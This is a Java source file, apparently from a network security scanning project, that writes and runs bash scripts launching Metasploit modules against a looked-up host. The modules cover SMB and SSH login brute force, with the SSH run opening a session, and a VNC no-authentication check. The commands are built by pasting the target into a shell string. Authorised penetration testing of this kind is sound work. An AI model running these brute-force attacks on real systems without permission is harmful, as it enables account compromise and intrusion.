package nss.function;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.Writer;

import nss.db.PenetrationTestDao;
import nss.util.ShellCommand;

public class PenetrationTest {

	private static String target = "127.0.0.1";
	
	public static void penetrateTarget(String type, String macAddress) {
		PenetrationTest.target = PenetrationTestDao.getIpByMac(macAddress).getAddress();
		if(type.equals("smb")) {
			smbLoginCheck();
		} else if (type.equals("ssh")) {
			sshLoginCheck();
		} else if (type.equals("vnc")) {
			vncAuthenticationCheck();
		}
	}
	
	private static void smbLoginCheck() {
	    try {
	    	File tempScript = File.createTempFile("script", null);

		    Writer streamWriter = new OutputStreamWriter(new FileOutputStream(tempScript));
		    PrintWriter printWriter = new PrintWriter(streamWriter);

		    printWriter.println("#!/bin/bash");
		    printWriter.println("msfconsole -q -x \"spool /home/kali/nss/reports/penReport.txt; use auxiliary/scanner/smb/smb_login; set RHOSTS " + target + "; set SMBUser victim; set SMBPass s3cr3t; set THREADS 50; run; exit\"");

		    printWriter.close();
		    
		    System.out.println("Running SMB Brute Force for " + target + "...");

		    ShellCommand.execute(tempScript);
		    
		    System.out.println("SMB Brute Force done for " + target + ". Report generated.");
		    
	    } catch(IOException e) {
	    	e.printStackTrace();
	    } catch(InterruptedException e) {
	    	e.printStackTrace();
	    }
	}
	
	private static void sshLoginCheck() {
		try {
	    	File tempScript = File.createTempFile("script", null);

		    Writer streamWriter = new OutputStreamWriter(new FileOutputStream(tempScript));
		    PrintWriter printWriter = new PrintWriter(streamWriter);

		    printWriter.println("#!/bin/bash");
		    printWriter.println("msfconsole -q -x \"spool /home/kali/nss/reports/penReport.txt; use auxiliary/scanner/ssh/ssh_login; set RHOSTS " + target + "; set USERPASS_FILE resources/userpass_file.txt; set VERBOSE false; run; sessions -i 1; exit\"");

		    printWriter.close();

		    System.out.println("Running SSH Brute Force for " + target + "...");

		    ShellCommand.execute(tempScript);
		    
		    System.out.println("SSH Brute Force done for " + target + ". Report generated.");
		    
	    } catch(IOException e) {
	    	e.printStackTrace();
	    } catch(InterruptedException e) {
	    	e.printStackTrace();
	    }
	}
	
	private static void vncAuthenticationCheck() {
		try {
	    	File tempScript = File.createTempFile("script", null);

		    Writer streamWriter = new OutputStreamWriter(new FileOutputStream(tempScript));
		    PrintWriter printWriter = new PrintWriter(streamWriter);

		    printWriter.println("#!/bin/bash");
		    printWriter.println("msfconsole -q -x \"spool /home/kali/nss/reports/penReport.txt; use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS " + target + "; set THREADS 50; run; exit\"");

		    printWriter.close();

		    System.out.println("Running VNC Authetication Check for " + target + "...");

		    ShellCommand.execute(tempScript);
		    
		    System.out.println("VNC Authentication Check done for " + target + ". Report generated.");
		    
	    } catch(IOException e) {
	    	e.printStackTrace();
	    } catch(InterruptedException e) {
	    	e.printStackTrace();
	    }
	}

}
